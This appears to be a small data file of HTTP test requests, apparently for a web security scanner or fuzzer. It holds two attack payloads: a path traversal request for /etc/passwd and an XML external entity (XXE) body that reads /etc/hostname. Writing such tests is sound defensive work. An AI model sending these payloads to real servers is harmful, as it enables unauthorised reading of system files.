{"name": "path-traversal", "method": "GET", "path": "/static/../../../../etc/passwd"}
{"name": "xxe-doctype", "method": "POST", "path": "/api", "headers": {"Content-Type": "application/xml"}, "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>&x;</r>"}
